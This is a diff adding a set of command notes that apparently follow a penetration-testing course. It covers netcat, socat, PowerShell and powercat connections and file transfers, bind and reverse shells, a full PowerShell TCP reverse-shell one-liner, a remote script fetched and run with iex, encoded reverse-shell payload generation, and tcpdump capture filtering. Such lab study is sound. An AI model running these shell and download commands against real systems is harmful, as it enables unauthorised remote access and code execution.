@@ -1,0 +1,229 @@
+Connecting to a TCP/UDP Port
+kali@kali:~$ nc -nv 10.11.0.22 110
+kali@kali:~$ nc -nv 10.11.0.22 110
+USER offsec
+quit
+
+
+
+
+Listening on a TCP/UDP Port
+C:\Users\offsec> nc -nlvp 4444
+kali@kali:~$ nc -nv 10.11.0.22 4444
+This chat is from the linux machine
+C:\Users\offsec> nc -nlvp 4444
+This chat is from the windows machine
+
+
+
+
+Transferring Files with Netcat 
+C:\Users\offsec> nc -nlvp 4444 > incoming.exe
+kali@kali:~$ locate wget.exe
+kali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
+C:\Users\offsec> nc -nlvp 4444 > incoming.exe
+C:\Users\offsec> incoming.exe -h
+
+
+
+
+Netcat Bind Shell Scenario
+C:\Users\offsec> ipconfig
+C:\Users\offsec> nc -nlvp 4444 -e cmd.exe
+kali@kali:~$ ip address show eth0 | grep inet
+kali@kali:~$ nc -nv 10.11.0.22 4444
+C:\Users\offsec> ipconfig
+
+
+
+
+
+Reverse Shell Scenario
+C:\Users\offsec> nc -nlvp 4444
+kali@kali:~$ ip address show eth0 | grep inet
+kali@kali:~$ nc -nv 10.11.0.22 4444 -e /bin/bash
+C:\Users\offsec>nc -nlvp 4444
+ip address show eth0 | grep inet
+
+
+
+
+
+Netcat vs Socat
+kali@kali:~$ nc <remote server's ip address> 80
+kali@kali:~$ socat - TCP4:<remote server's ip address>:80
+kali@kali:~$ sudo nc -lvp localhost 443
+kali@kali:~$ sudo socat TCP4-LISTEN:443 STDOUT
+
+
+
+
+Socat File Transfers
+kali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
+C:\Users\offsec> type received_secret_passwords.txt
+
+
+
+
+Socat Reverse Shells
+C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT
+kali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+whoami
+kali
+id
+
+
+
+
+
+Socat Encrypted Bind Shells
+kali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days
+362 -out bind_shell.crt
+Country Name (2 letter code) [AU]:US
+State or Province Name (full name) [Some-State]:Georgia
+Locality Name (eg, city) []:Atlanta
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:Offsec
+Organizational Unit Name (eg, section) []:Try Harder Department
+kali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
+kali@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork
+EXEC:/bin/bash
+C:\Users\offsec> socat - OPENSSL:10.11.0.4:443,verify=0
+id
+whoami
+
+
+
+
+
+PowerShell and Powercat
+PS C:\WINDOWS\system32> Set-ExecutionPolicy Unrestricted
+PS C:\WINDOWS\system32> Get-ExecutionPolicy
+
+
+
+
+PowerShell File Transfers
+C:\Users\offsec> powershell -c "(new-object
+System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Deskto
+p\wget.exe')"
+C:\Users\offsec\Desktop> wget.exe -V
+
+
+
+PowerShell Reverse Shells
+kali@kali:~$ sudo nc -lnvp 443
+
+C:\Users\offsec> powershell -c "$client = New-Object
+System.Net.Sockets.TCPClient('10.11.0.4',443);$stream =
+$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,
+$bytes.Length)) -ne 0){;$data = (New-Object -TypeName
+System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =
+([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
+th);$stream.Flush();}$client.Close()"
+
+kali@kali:~$ sudo nc -lnvp 443
+
+
+
+
+
+
+PowerShell Bind Shells 
+kali@kali:~$ nc -nv 10.11.0.22 443
+ipconfig
+
+
+
+
+
+Powercat
+PS C:\Users\Offsec> . .\powercat.ps1
+PS C:\Users\Offsec> iex (New-Object
+System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/po
+wercat/master/powercat.ps1')
+
+PS C:\Users\offsec> powercat
+PS C:\Users\offsec> powercat -h
+
+
+
+
+
+
+
+Powercat File Transfers
+kali@kali:~$ sudo nc -lnvp 443 > receiving_powercat.ps1
+PS C:\Users\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
+^C
+kali@kali:~$ ls receiving_powercat.ps1
+
+
+
+
+
+
+Powercat Reverse Shells 
+kali@kali:~$ sudo nc -lvp 443
+PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe
+
+
+
+
+
+
+
+Powercat Bind Shells
+PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe
+kali@kali:~$ nc 10.11.0.22 443
+
+
+
+
+
+Powercat Stand-Alone Payloads 
+PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
+PS C:\Users\offsec> ./reverseshell.ps1
+PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+kali@kali:~$ sudo nc -lnvp 443
+
+
+
+
+
+
+Launching Wireshark
+kali@kali:~$ sudo wireshark
+
+
+
+
+
+
+Display Filters
+kali@kali:~$ ftp 10.11.1.13
+
+
+
+
+
+
+
+Filtering Traffic 
+kali@kali:~$ sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $5}' | sort | uniq -c | head
+sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
+sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
+sudo tcpdump -n port 81 -r password_cracking_filtered.pcap
+kali@kali:~$ sudo tcpdump -nX -r password_cracking_filtered.pcap
+
+
+
+
+
+Advanced Header Filtering 
+kali@kali:~$ echo "$((2#00011000))"
+kali@kali:~$ sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
+
+
+
+
